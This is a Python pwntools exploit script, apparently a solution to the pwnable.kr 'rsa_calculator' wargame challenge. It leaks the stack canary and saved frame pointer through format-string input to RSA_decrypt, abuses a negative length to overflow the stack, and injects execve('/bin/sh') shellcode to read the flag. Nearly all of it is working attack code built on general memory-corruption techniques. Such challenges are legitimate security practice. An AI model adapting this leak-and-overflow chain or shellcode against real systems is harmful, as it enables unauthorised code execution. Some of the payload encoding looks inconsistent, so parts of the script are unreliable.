# First thing I notice here is that we can get v5 to be negative and it would still run
# so if we can get anything in so it would point to system.plt (found at 0x4007c0) and have
# pointer to "/bin/sh" found in [rsp] it would work

# Notice RSA_decrypt has major bug - we can insert size below 0
# and since the loop only checks != 0 so we can insert any size we want ( within limitation of int )

# So in RSA_decrypt we also FSB so we can read stack canary, and then afterwards overflow in one of the functions
# and override return address to be 0x4007c0 and override address above it to be an offset of "/bin/sh".
# The address to "/bin/sh" string is an address on bss which we can insert in "g_ebuf" or "g_pbuf".

from pwn import *

encrypted_fsb_show_stack_canary = b"25000000320000003000000035000000240000006c0000006c00000075000000" # %205$llu
encrypted_fsb_show_rbp = b"25000000320000003000000036000000240000006c0000006c00000075000000" # %206$llu

bin_sh_hex_enc = b"2f62696e2f736800"
bin_sh_str_bss_offset = hex(0x6020E0)[2:]

system_plt_address = hex(0x4007c0)[2:]
help_address = hex(0x401262)[2:]
printf_rsa_decrypt = hex(0x40122B)[2:]
main_rbp_rsp = hex(0x4012AE)[2:]

stack_canary = ...
payload_address = ...

r = remote("pwnable.kr", 9012)

# Set key - random values
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"p : ", b"20")
r.sendlineafter(b"q : ", b"20")
r.sendlineafter(b"set public key exponent e : ", b"1")
r.sendlineafter(b"set private key exponent d : ", b"1")

r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"how long is your data?(max=1024) : ", b"1024")
r.sendlineafter(b"paste your hex encoded data\n", encrypted_fsb_show_stack_canary)
r.recvuntil(b"- decrypted result -\n")

# Sometimes fsb also prints with null byte at end so check for that
stack_canary = hex(int(r.recvline().strip()))[2:]
if len(stack_canary) > 8 * 2:
    stack_canary = stack_canary[2:]

payload = b"31" * 16
payload += "".join([hex(ord(stack_canary[i]))[2:] + hex(ord(stack_canary[i + 1]))[2:] for i in range(len(stack_canary) - 2, -1, -2)]).encode()
payload += b"31" * 16 # Override saved rbp
payload += "".join([hex(ord(main_rbp_rsp[i]))[2:] + hex(ord(main_rbp_rsp[i + 1]))[2:] for i in range(len(main_rbp_rsp) - 2, -1, -2)]).encode() + b"30" * 5 * 2
payload += b"3131" * 114

r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"how long is your data?(max=1024) : ", b"-1")
r.sendlineafter(b"paste your hex encoded data\n", payload)

r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"how long is your data?(max=1024) : ", b"-1")
r.sendlineafter(b"paste your hex encoded data\n", encrypted_fsb_show_rbp)

r.recvuntil(b"- decrypted result -\n")

saved_rbp = hex(int(r.recvline().strip()))[2:]
if len(saved_rbp) > 8 * 2:
    saved_rbp = saved_rbp[2:]

payload_address = hex(int(saved_rbp, 16) - 0x630)[2:]
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b"a" * (32 - len(payload))
payload += "".join([hex(ord(stack_canary[i]))[2:] + hex(ord(stack_canary[i + 1]))[2:] for i in range(len(stack_canary) - 2, -1, -2)]).encode()
payload += b"31" * 16 # Override saved rbp
payload += "".join([hex(ord(payload_address[i]))[2:] + hex(ord(payload_address[i + 1]))[2:] for i in range(len(payload_address) - 2, -1, -2)]).encode() + b"30" * 5 * 2
payload += b"3131" * 114

r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"how long is your data?(max=1024) : ", b"-1")
r.sendlineafter(b"paste your hex encoded data\n", payload)
r.recv()
r.recv()

r.sendline(b"cat rsa_calculator_pwn/flag")
flag = r.recv().decode().strip()

r.close()
print("Flag is:", flag)